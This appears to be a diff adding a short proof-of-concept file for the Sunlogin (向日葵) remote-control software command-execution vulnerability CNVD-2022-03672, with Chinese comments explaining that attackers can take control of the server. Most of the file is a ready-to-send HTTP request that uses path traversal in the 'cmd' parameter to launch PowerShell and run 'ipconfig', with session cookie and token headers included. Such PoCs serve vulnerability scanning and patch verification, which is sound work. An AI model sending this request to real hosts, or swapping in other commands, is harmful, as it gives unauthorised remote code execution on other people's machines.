@@ -1,0 +1,12 @@
+# 向日葵命令执行漏洞(CNVD-2022-03672)
+# 向日葵是一款免费的集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。
+# 
+# 向日葵简约版存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。
+GET /check?acid=80000912&cmd=ping..%2F..%2F..%2Fwindows%2Fsystem32%2Fwindowspowershell%2Fv1.0%2Fpowershell.exe+ipconfig&bid=hd_tag_m8mv25yu HTTP/1.1
+Host: www.swaf.com
+Cookie: CID=dmPqDgSa8jOYgp1Iu1U7l1HbRTVJwZL3
+RM-PRO-BusinessID: hd_tag_m8mv25yu
+RM-PRO-Token: cec148b78f2776f8b0258e1b0023bd1d
+RM-PRO-Time: 1742808514403
+User-Agent: curl/7.83.1
+
